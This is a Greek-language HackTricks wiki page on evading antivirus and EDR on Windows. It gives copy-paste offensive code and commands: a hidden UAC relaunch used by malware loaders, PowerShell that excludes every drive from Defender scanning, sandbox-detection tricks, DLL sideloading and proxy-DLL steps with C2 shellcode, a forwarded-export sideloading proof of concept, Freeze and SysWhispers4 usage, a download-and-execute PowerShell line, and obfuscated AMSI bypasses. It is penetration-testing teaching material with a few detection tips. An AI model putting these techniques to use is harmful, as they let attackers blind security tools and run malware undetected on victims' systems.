# Παράκαμψη Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε αρχικά από τον** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Διακοπή του Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ένα εργαλείο για να σταματήσει τη λειτουργία του Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Ένα εργαλείο που σταματά τη λειτουργία του Windows Defender προσποιούμενο ότι είναι άλλο AV.
- [Απενεργοποίηση του Defender αν είστε admin](basic-powershell-for-pentesters/README.md)

### Δόλωμα UAC τύπου installer πριν από την παραποίηση του Defender

Δημόσια loaders που μεταμφιέζονται σε cheats παιχνιδιών συχνά διανέμονται ως unsigned installers Node.js/Nexe, οι οποίοι πρώτα **ζητούν από τον χρήστη αυξημένα δικαιώματα** και έπειτα εξουδετερώνουν το Defender. Η διαδικασία είναι απλή:

1. Ελέγχουν αν υπάρχει περιβάλλον διαχειριστή με το `net session`. Η εντολή πετυχαίνει μόνο όταν ο χρήστης διαθέτει δικαιώματα admin, οπότε η αποτυχία σημαίνει ότι ο loader εκτελείται από τυπικό χρήστη.
2. Εκκινούν αμέσως ξανά τον εαυτό τους με το ρήμα `RunAs`, ώστε να εμφανιστεί το αναμενόμενο μήνυμα συγκατάθεσης UAC, διατηρώντας παράλληλα την αρχική γραμμή εντολών.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Τα θύματα ήδη πιστεύουν ότι εγκαθιστούν «σπασμένο» λογισμικό, οπότε συνήθως αποδέχονται την προτροπή, δίνοντας στο malware τα δικαιώματα που χρειάζεται για να αλλάξει την πολιτική του Defender.<sup>[[26]](#references)</sup>

### Γενικευμένες εξαιρέσεις `MpPreference` για κάθε γράμμα μονάδας δίσκου

Μόλις αποκτήσουν αυξημένα δικαιώματα, οι αλυσίδες τύπου GachiLoader μεγιστοποιούν τα τυφλά σημεία του Defender, αντί να απενεργοποιούν εντελώς την υπηρεσία. Αρχικά, ο loader τερματίζει τη διεργασία επιτήρησης του GUI (`taskkill /F /IM SecHealthUI.exe`) και στη συνέχεια προσθέτει **εξαιρετικά ευρείες εξαιρέσεις**, ώστε να μην είναι δυνατή η σάρωση κάθε προφίλ χρήστη, καταλόγου συστήματος και αφαιρούμενου δίσκου:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Βασικές παρατηρήσεις:

- Ο βρόχος διατρέχει κάθε προσαρτημένο σύστημα αρχείων (D:\, E:\, USB sticks κ.λπ.), επομένως **κάθε μελλοντικό payload που τοποθετείται οπουδήποτε στον δίσκο αγνοείται**.
- Ο αποκλεισμός της επέκτασης `.sys` είναι προληπτικός — οι attackers διατηρούν την επιλογή να φορτώσουν αργότερα unsigned drivers, χωρίς να χρειαστεί να πειράξουν ξανά το Defender.
- Όλες οι αλλαγές καταγράφονται στο `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, ώστε τα επόμενα στάδια να μπορούν να επιβεβαιώσουν ότι οι εξαιρέσεις παραμένουν ενεργές ή να τις επεκτείνουν χωρίς να ενεργοποιήσουν ξανά το UAC.

Καθώς δεν διακόπτεται καμία υπηρεσία του Defender, οι απλοϊκοί έλεγχοι κατάστασης εξακολουθούν να αναφέρουν «το antivirus είναι ενεργό», παρόλο που η επιθεώρηση σε πραγματικό χρόνο δεν ελέγχει ποτέ αυτές τις διαδρομές.<sup>[[26]](#references)</sup>

## **Μεθοδολογία AV Evasion**

Επί του παρόντος, τα AV χρησιμοποιούν διαφορετικές μεθόδους για να ελέγξουν αν ένα αρχείο είναι κακόβουλο ή όχι: static detection, dynamic analysis και, για τα πιο προηγμένα EDR, behavioural analysis.

### **Static detection**

Το Static detection επιτυγχάνεται με τον εντοπισμό γνωστών κακόβουλων strings ή συστοιχιών bytes σε ένα binary ή script, καθώς και με την εξαγωγή πληροφοριών από το ίδιο το αρχείο (π.χ. περιγραφή αρχείου, όνομα εταιρείας, digital signatures, εικονίδιο, checksum κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών δημόσιων εργαλείων μπορεί να οδηγήσει ευκολότερα στον εντοπισμό σας, καθώς πιθανότατα έχουν ήδη αναλυθεί και επισημανθεί ως κακόβουλα. Υπάρχουν μερικοί τρόποι για να παρακάμψετε αυτό το είδος εντοπισμού:

- **Κρυπτογράφηση**

Αν κρυπτογραφήσετε το binary, το AV δεν θα μπορεί να εντοπίσει το πρόγραμμά σας, αλλά θα χρειαστείτε κάποιο είδος loader για να το αποκρυπτογραφήσει και να το εκτελέσει στη μνήμη.

- **Obfuscation**

Μερικές φορές αρκεί να αλλάξετε ορισμένα strings στο binary ή το script σας για να το παρακάμψετε το AV, αλλά αυτό μπορεί να είναι χρονοβόρο, ανάλογα με το τι προσπαθείτε να αποκρύψετε.

- **Custom tooling**

Αν αναπτύξετε τα δικά σας εργαλεία, δεν θα υπάρχουν γνωστά κακόβουλα signatures, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!TIP]
> Ένας καλός τρόπος για να ελέγξετε την ανίχνευση static detection του Windows Defender είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ουσιαστικά χωρίζει το αρχείο σε πολλαπλά τμήματα και ζητά από το Defender να σαρώσει το καθένα ξεχωριστά. Έτσι, μπορεί να σας δείξει ακριβώς ποια strings ή bytes στο binary σας επισημαίνονται.

Σας συνιστώ ανεπιφύλακτα να δείτε αυτήν την [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) σχετικά με το πρακτικό AV Evasion.

### **Dynamic analysis**

Dynamic analysis είναι όταν το AV εκτελεί το binary σας σε ένα sandbox και παρακολουθεί για κακόβουλη δραστηριότητα (π.χ. απόπειρα αποκρυπτογράφησης και ανάγνωσης των κωδικών πρόσβασης του browser σας, εκτέλεση minidump στο LSASS κ.λπ.). Αυτό το μέρος μπορεί να είναι λίγο πιο δύσκολο, αλλά υπάρχουν ορισμένα πράγματα που μπορείτε να κάνετε για να αποφύγετε τα sandboxes.

- **Αναμονή πριν από την εκτέλεση** Ανάλογα με την υλοποίηση, μπορεί να είναι ένας εξαιρετικός τρόπος παράκαμψης του dynamic analysis του AV. Τα AV έχουν πολύ λίγο χρόνο για να σαρώσουν αρχεία, ώστε να μην διακόπτουν τη ροή εργασίας του χρήστη. Επομένως, οι μεγάλες αναμονές μπορούν να διαταράξουν την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά AV sandboxes μπορούν απλώς να παραλείψουν την αναμονή, ανάλογα με την υλοποίησή της.
- **Έλεγχος των πόρων του μηχανήματος** Συνήθως, τα sandboxes διαθέτουν πολύ περιορισμένους πόρους (π.χ. < 2GB RAM), διαφορετικά θα μπορούσαν να επιβραδύνουν το μηχάνημα του χρήστη. Μπορείτε επίσης να γίνετε δημιουργικοί, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμη και την ταχύτητα των ανεμιστήρων — δεν υλοποιούνται όλα στο sandbox.
- **Έλεγχοι ειδικοί για το μηχάνημα** Αν θέλετε να στοχεύσετε έναν χρήστη του οποίου ο σταθμός εργασίας είναι συνδεδεμένος στο domain "contoso.local", μπορείτε να ελέγξετε το domain του υπολογιστή για να δείτε αν ταιριάζει με αυτό που έχετε ορίσει. Αν δεν ταιριάζει, μπορείτε να τερματίσετε το πρόγραμμά σας.

Αποδεικνύεται ότι το computer name του Microsoft Defender Sandbox είναι HAL9TH. Επομένως, μπορείτε να ελέγξετε το όνομα του υπολογιστή στο malware σας πριν από την εκτέλεσή του. Αν το όνομα είναι HAL9TH, σημαίνει ότι βρίσκεστε μέσα στο sandbox του Defender, οπότε μπορείτε να τερματίσετε το πρόγραμμά σας.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικές ακόμη πολύ καλές συμβουλές από τον [@mgeeky](https://twitter.com/mariuszbit) για την αντιμετώπιση των Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> κανάλι #malware-dev</p></figcaption></figure>

Όπως είπαμε νωρίτερα σε αυτήν την ανάρτηση, τα **δημόσια εργαλεία** κάποια στιγμή **θα εντοπιστούν**, οπότε θα πρέπει να αναρωτηθείτε το εξής:

Για παράδειγμα, αν θέλετε να κάνετε dump το LSASS, **χρειάζεται πραγματικά να χρησιμοποιήσετε το mimikatz**; Ή θα μπορούσατε να χρησιμοποιήσετε ένα λιγότερο γνωστό project που κάνει επίσης dump το LSASS;

Η δεύτερη επιλογή είναι πιθανότατα η σωστή. Για παράδειγμα, το mimikatz είναι πιθανότατα ένα από τα πιο επισημασμένα malware από AV και EDR — αν όχι το πιο επισημασμένο. Παρόλο που το ίδιο το project είναι εξαιρετικό, είναι επίσης εφιάλτης να το χρησιμοποιήσετε για να παρακάμψετε τα AV. Επομένως, αναζητήστε εναλλακτικές λύσεις για αυτό που προσπαθείτε να πετύχετε.

> [!TIP]
> Όταν τροποποιείτε τα payloads σας για evasion, φροντίστε να **απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων** στο Defender και, παρακαλώ, σοβαρά, **ΜΗΝ ΚΑΝΕΤΕ UPLOAD ΣΤΟ VIRUSTOTAL** αν στόχος σας είναι το μακροπρόθεσμο evasion. Αν θέλετε να ελέγξετε αν ένα συγκεκριμένο AV εντοπίζει το payload σας, εγκαταστήστε το σε ένα VM, δοκιμάστε να απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων και κάντε δοκιμές εκεί μέχρι να μείνετε ικανοποιημένοι με το αποτέλεσμα.

## EXEs έναντι DLLs

Όποτε είναι δυνατό, **προτιμάτε πάντα τη χρήση DLLs για evasion**. Από την εμπειρία μου, τα αρχεία DLL συνήθως **εντοπίζονται και αναλύονται πολύ λιγότερο**, οπότε πρόκειται για ένα πολύ απλό τέχνασμα που μπορείτε να χρησιμοποιήσετε σε ορισμένες περιπτώσεις για να αποφύγετε τον εντοπισμό (αν, φυσικά, το payload σας μπορεί να εκτελεστεί ως DLL).

Όπως βλέπουμε σε αυτήν την εικόνα, ένα DLL Payload από το Havoc έχει ποσοστό εντοπισμού 4/26 στο antiscan.me, ενώ το EXE payload έχει ποσοστό εντοπισμού 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>σύγκριση στο antiscan.me ενός κανονικού Havoc EXE payload με ένα κανονικό Havoc DLL</p></figcaption></figure>

Τώρα θα παρουσιάσουμε μερικά τεχνάσματα που μπορείτε να χρησιμοποιήσετε με αρχεία DLL για να είστε πολύ πιο stealthy.

## DLL Sideloading & Proxying

Το **DLL Sideloading** εκμεταλλεύεται τη σειρά αναζήτησης DLL που χρησιμοποιεί ο loader, τοποθετώντας την εφαρμογή-θύμα και τα κακόβουλα payloads δίπλα-δίπλα.

Μπορείτε να εντοπίσετε προγράμματα που είναι ευάλωτα σε DLL Sideloading χρησιμοποιώντας το [Siofra](https://github.com/Cybereason/siofra) και το ακόλουθο powershell script:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Αυτή η εντολή εμφανίζει τη λίστα των προγραμμάτων μέσα στο "C:\Program Files\\" που είναι ευάλωτα σε DLL hijacking, καθώς και τα αρχεία DLL που προσπαθούν να φορτώσουν.

Συνιστώ ανεπιφύλακτα να **εξερευνήσετε μόνοι σας προγράμματα που είναι ευάλωτα σε DLL Hijacking/Sideloading**. Αυτή η τεχνική είναι αρκετά stealthy όταν εκτελείται σωστά, αλλά αν χρησιμοποιήσετε δημόσια γνωστά προγράμματα που υποστηρίζουν DLL Sideloading, μπορεί να εντοπιστείτε εύκολα.

Αν απλώς τοποθετήσετε ένα κακόβουλο DLL με το όνομα που αναμένει να φορτώσει ένα πρόγραμμα, αυτό δεν θα φορτώσει το payload σας, καθώς το πρόγραμμα αναμένει να υπάρχουν συγκεκριμένες συναρτήσεις μέσα σε αυτό το DLL. Για να διορθώσουμε αυτό το πρόβλημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

Το **DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από το proxy (και κακόβουλο) DLL στο αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντάς μας να εκτελέσουμε το payload μας.

Θα χρησιμοποιήσω το project [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) από τον [@flangvik](https://twitter.com/Flangvik/)

Ακολουθούν τα βήματα που ακολούθησα:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και το αρχικό DLL με νέο όνομα.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Αυτά είναι τα αποτελέσματα:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Τόσο το shellcode μας (κωδικοποιημένο με το [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν Detection rate 0/26 στο [antiscan.me](https://antiscan.me)! Θα το θεωρούσα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Συνιστώ ανεπιφύλακτα** να παρακολουθήσετε το [twitch VOD του S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) σχετικά με το DLL Sideloading, καθώς και [το βίντεο του ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), για να μάθετε περισσότερα και σε βάθος σχετικά με όσα συζητήσαμε.

### Κατάχρηση Forwarded Exports (ForwardSideLoading)

Οι μονάδες PE των Windows μπορούν να κάνουν export συναρτήσεις που στην πραγματικότητα είναι «forwarders»: αντί να δείχνει σε κώδικα, η καταχώριση του export περιέχει μια συμβολοσειρά ASCII της μορφής `TargetDll.TargetFunc`. Όταν ένας caller επιλύει το export, ο Windows loader:

- Φορτώνει το `TargetDll`, αν δεν έχει ήδη φορτωθεί
- Επιλύει το `TargetFunc` από αυτό

Βασικές συμπεριφορές που πρέπει να γνωρίζετε:
- Αν το `TargetDll` είναι KnownDLL, παρέχεται από τον προστατευμένο χώρο ονομάτων KnownDLLs (π.χ. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Αν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική σειρά αναζήτησης DLL, η οποία περιλαμβάνει τον κατάλογο της μονάδας που εκτελεί την επίλυση του forward.

Αυτό επιτρέπει μια έμμεση primitive sideloading: βρείτε ένα υπογεγραμμένο DLL που κάνει export μια συνάρτηση με forward προς ένα όνομα μονάδας που δεν είναι KnownDLL και τοποθετήστε το στον ίδιο κατάλογο με ένα DLL που ελέγχει ο επιτιθέμενος και έχει ακριβώς το όνομα της μονάδας-στόχου του forward. Όταν γίνει κλήση στο forwarded export, ο loader επιλύει το forward και φορτώνει το DLL σας από τον ίδιο κατάλογο, εκτελώντας το DllMain σας.<sup>[[13]](#references)</sup>

Παράδειγμα που παρατηρήθηκε στα Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` δεν είναι KnownDLL, επομένως επιλύεται μέσω της κανονικής σειράς αναζήτησης.

PoC (copy-paste):
1) Αντιγράψτε το υπογεγραμμένο DLL συστήματος σε έναν εγγράψιμο φάκελο
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Ένα ελάχιστο `DllMain` αρκεί για να επιτευχθεί code execution· δεν χρειάζεται να υλοποιήσετε τη forwarded function για να ενεργοποιηθεί το `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Ενεργοποιήστε την προώθηση με ένα υπογεγραμμένο LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Παρατηρηθείσα συμπεριφορά:
- Το rundll32 (υπογεγραμμένο) φορτώνει το side-by-side `keyiso.dll` (υπογεγραμμένο)
- Κατά την επίλυση του `KeyIsoSetAuditingInterface`, ο loader ακολουθεί το forward προς το `NCRYPTPROV.SetAuditingInterface`
- Στη συνέχεια, ο loader φορτώνει το `NCRYPTPROV.dll` από το `C:\test` και εκτελεί το `DllMain` του
- Αν δεν έχει υλοποιηθεί το `SetAuditingInterface`, θα λάβετε σφάλμα "missing API" μόνο αφού έχει ήδη εκτελεστεί το `DllMain`

Συμβουλές για hunting:
- Εστιάστε σε forwarded exports όπου το target module δεν είναι KnownDLL. Τα KnownDLLs παρατίθενται στο `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να απαριθμήσετε forwarded exports με εργαλεία όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε το inventory των forwarder των Windows 11 για να αναζητήσετε υποψήφια: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ιδέες για εντοπισμό/άμυνα:
- Παρακολουθήστε τα LOLBins (π.χ., rundll32.exe) που φορτώνουν υπογεγραμμένα DLL από μη συστημικές διαδρομές και, στη συνέχεια, φορτώνουν non-KnownDLLs με το ίδιο βασικό όνομα από αυτόν τον κατάλογο
- Δημιουργήστε ειδοποιήσεις για αλυσίδες διεργασιών/μονάδων όπως: `rundll32.exe` → μη συστημικό `keyiso.dll` → `NCRYPTPROV.dll` σε διαδρομές εγγράψιμες από τον χρήστη
- Επιβάλετε πολιτικές ακεραιότητας κώδικα (WDAC/AppLocker) και απαγορεύστε την εγγραφή και εκτέλεση στους καταλόγους εφαρμογών

## [**Freeze**](https://github.com/optiv/Freeze)

`Το Freeze είναι ένα toolkit payload για την παράκαμψη EDR μέσω suspended processes, direct syscalls και εναλλακτικών μεθόδων εκτέλεσης`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με stealth τρόπο.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Το Evasion είναι απλώς ένα παιχνίδι γάτας και ποντικιού: ό,τι λειτουργεί σήμερα μπορεί να εντοπίζεται αύριο, γι’ αυτό μην βασίζεστε ποτέ σε ένα μόνο εργαλείο. Αν είναι δυνατό, δοκιμάστε να συνδυάσετε πολλές τεχνικές evasion.

## Direct/Indirect Syscalls & Επίλυση SSN (SysWhispers4)

Τα EDR συχνά τοποθετούν **inline hooks σε user mode** στα syscall stubs του `ntdll.dll`. Για να παρακάμψετε αυτά τα hooks, μπορείτε να δημιουργήσετε stubs για **direct** ή **indirect** syscalls, τα οποία φορτώνουν το σωστό **SSN** (System Service Number) και μεταβαίνουν σε kernel mode χωρίς να εκτελούν το hooked export entrypoint.<sup>[[32]](#references)</sup>

**Επιλογές κλήσης:**
- **Direct (embedded)**: εκπέμπει μια εντολή `syscall`/`sysenter`/`SVC #0` στο generated stub (χωρίς να γίνεται hit σε export του `ntdll`).
- **Indirect**: μεταβαίνει σε ένα υπάρχον `syscall` gadget μέσα στο `ntdll`, ώστε η μετάβαση στον kernel να φαίνεται ότι προέρχεται από το `ntdll` (χρήσιμο για heuristic evasion). Το **randomized indirect** επιλέγει ένα gadget από ένα pool σε κάθε κλήση.
- **Egg-hunt**: αποφεύγει την ενσωμάτωση της στατικής ακολουθίας opcode `0F 05` στο δίσκο, εντοπίζοντας μια ακολουθία syscall κατά το runtime.

**Στρατηγικές ανθεκτικής στα hooks επίλυσης SSN:**
- **FreshyCalls (VA sort)**: συμπεραίνει τα SSN ταξινομώντας τα syscall stubs βάσει virtual address αντί να διαβάζει τα bytes των stubs.
- **SyscallsFromDisk**: κάνει map ένα καθαρό `\KnownDlls\ntdll.dll`, διαβάζει τα SSN από το `.text` και μετά το κάνει unmap (παρακάμπτει όλα τα in-memory hooks).
- **RecycledGate**: συνδυάζει την εξαγωγή συμπερασμάτων SSN μέσω ταξινόμησης VA με επικύρωση opcode όταν ένα stub είναι καθαρό· αν είναι hooked, επιστρέφει στην εξαγωγή συμπερασμάτων μέσω VA.
- **HW Breakpoint**: ορίζει το DR0 στην εντολή `syscall` και χρησιμοποιεί ένα VEH για να καταγράψει το SSN από το `EAX` κατά το runtime, χωρίς να αναλύει hooked bytes.

Παράδειγμα χρήσης του SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

Το AMSI δημιουργήθηκε για να αποτρέπει το "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AV μπορούσαν να σαρώνουν μόνο **αρχεία στον δίσκο**, οπότε αν μπορούσες με κάποιον τρόπο να εκτελέσεις payloads **απευθείας στη μνήμη**, το AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε επαρκή ορατότητα.

Η δυνατότητα AMSI είναι ενσωματωμένη στα ακόλουθα στοιχεία των Windows.

- Έλεγχος λογαριασμού χρήστη ή UAC (ανύψωση δικαιωμάτων EXE, COM, MSI ή εγκατάστασης ActiveX)
- PowerShell (scripts, διαδραστική χρήση και δυναμική αξιολόγηση κώδικα)
- Windows Script Host (wscript.exe και cscript.exe)
- JavaScript και VBScript
- Office VBA macros

Επιτρέπει στις λύσεις antivirus να επιθεωρούν τη συμπεριφορά των scripts, εκθέτοντας το περιεχόμενό τους σε μορφή που είναι τόσο αποκρυπτογραφημένη όσο και μη obfuscated.

Η εκτέλεση του `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα προκαλέσει την ακόλουθη ειδοποίηση στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατήρησε ότι προσθέτει το `amsi:` και έπειτα τη διαδρομή προς το εκτελέσιμο από το οποίο εκτελέστηκε το script· σε αυτή την περίπτωση, το powershell.exe.

Δεν γράψαμε κανένα αρχείο στον δίσκο, αλλά παρ' όλα αυτά εντοπιστήκαμε στη μνήμη λόγω του AMSI.

Επιπλέον, από την έκδοση **.NET 4.8** και μετά, ο κώδικας C# περνά επίσης από το AMSI. Αυτό επηρεάζει ακόμη και το `Assembly.Load(byte[])` για φόρτωση και εκτέλεση στη μνήμη. Γι' αυτό συνιστάται η χρήση παλαιότερων εκδόσεων του .NET (όπως η 4.7.2 ή παλαιότερη) για εκτέλεση στη μνήμη, αν θέλεις να αποφύγεις το AMSI.

Υπάρχουν μερικοί τρόποι παράκαμψης του AMSI:

- **Obfuscation**

Επειδή το AMSI βασίζεται κυρίως σε στατικές ανιχνεύσεις, η τροποποίηση των scripts που προσπαθείς να φορτώσεις μπορεί να είναι ένας καλός τρόπος για να αποφύγεις τον εντοπισμό.

Ωστόσο, το AMSI μπορεί να αφαιρεί το obfuscation από scripts, ακόμα κι αν έχουν πολλαπλά επίπεδα, επομένως το obfuscation μπορεί να είναι κακή επιλογή, ανάλογα με τον τρόπο που γίνεται. Αυτό σημαίνει ότι η αποφυγή του εντοπισμού δεν είναι τόσο απλή. Παρότι, μερικές φορές, αρκεί να αλλάξεις μερικά ονόματα μεταβλητών, οπότε εξαρτάται από το πόσο έχει επισημανθεί κάτι.

- **AMSI Bypass**

Επειδή το AMSI υλοποιείται φορτώνοντας ένα DLL στη διεργασία powershell (καθώς και στις cscript.exe, wscript.exe κ.λπ.), είναι εύκολο να παρέμβεις σε αυτό, ακόμη και ως χρήστης χωρίς προνομιακά δικαιώματα. Λόγω αυτού του ελαττώματος στην υλοποίηση του AMSI, ερευνητές έχουν βρει πολλούς τρόπους αποφυγής της σάρωσης AMSI.

**Εξαναγκασμός σφάλματος**

Ο εξαναγκασμός αποτυχίας της αρχικοποίησης του AMSI (amsiInitFailed) έχει ως αποτέλεσμα να μην ξεκινά καμία σάρωση για την τρέχουσα διεργασία. Αυτό αποκαλύφθηκε αρχικά από τον [Matt Graeber](https://twitter.com/mattifestation), και η Microsoft ανέπτυξε μια signature για να αποτρέψει την ευρύτερη χρήση του.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Αρκούσε μία γραμμή κώδικα PowerShell για να καταστήσει το AMSI μη λειτουργικό για την τρέχουσα διεργασία PowerShell. Αυτή η γραμμή έχει φυσικά επισημανθεί από το ίδιο το AMSI, επομένως χρειάζεται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Ακολουθεί ένα τροποποιημένο AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Λάβετε υπόψη ότι αυτό πιθανότατα θα εντοπιστεί μόλις δημοσιευτεί αυτή η ανάρτηση, επομένως δεν θα πρέπει να δημοσιεύσετε κώδικα αν σκοπεύετε να παραμείνετε μη εντοπίσιμοι.

**Memory Patching**

Αυτή η τεχνική ανακαλύφθηκε αρχικά από τον [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει τον εντοπισμό της διεύθυνσης της συνάρτησης "AmsiScanBuffer" στο amsi.dll (η οποία είναι υπεύθυνη για τη σάρωση της εισόδου που παρέχει ο χρήστης) και την αντικατάστασή της με εντολές που επιστρέφουν τον κωδικό για το E_INVALIDARG. Με αυτόν τον τρόπο, το αποτέλεσμα της πραγματικής σάρωσης θα είναι 0, το οποίο ερμηνεύεται ως καθαρό αποτέλεσμα.

> [!TIP]
> Διαβάστε το [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για πιο λεπτομερή επεξήγηση.

Υπάρχουν επίσης πολλές άλλες τεχνικές για την παράκαμψη του AMSI με powershell. Δείτε [**αυτή τη σελίδα**](basic-powershell-for-pentesters/index.html#amsi-bypass) και [**αυτό το repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθετε περισσότερα.

### Αποκλεισμός του AMSI με την αποτροπή φόρτωσης του amsi.dll (hook στο LdrLoadDll)

